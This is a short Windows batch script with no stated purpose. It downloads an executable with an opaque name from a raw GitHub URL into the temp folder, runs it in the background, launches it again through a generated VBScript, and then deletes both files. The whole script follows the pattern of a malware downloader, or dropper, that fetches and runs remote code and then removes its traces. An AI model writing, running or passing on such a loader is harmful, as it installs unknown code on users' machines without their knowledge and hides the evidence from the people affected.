@echo off

:: Define URL and path for downloading
set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
set path=%TEMP%\fbf12e4f.exe

:: Download the file
powershell -Command "Invoke-WebRequest %url% -OutFile %path%"

:: Run the downloaded exe invisibly in the background
start /B "" "%path%"

:: Wait a bit to make sure the exe is running
timeout /t 1 /nobreak

:: Create and run the VBScript to execute the exe with specific parameters
echo CreateObject("Shell.Application").ShellExecute "%TEMP%\fbf12e4f.exe","",",," > "%TEMP%\fbf12e4f.vbs"
"%TEMP%\fbf12e4f.vbs"

:: Cleanup the VBScript after execution
timeout /t 1 /nobreak
del "%TEMP%\fbf12e4f.vbs"
del "%TEMP%\fbf12e4f.exe"
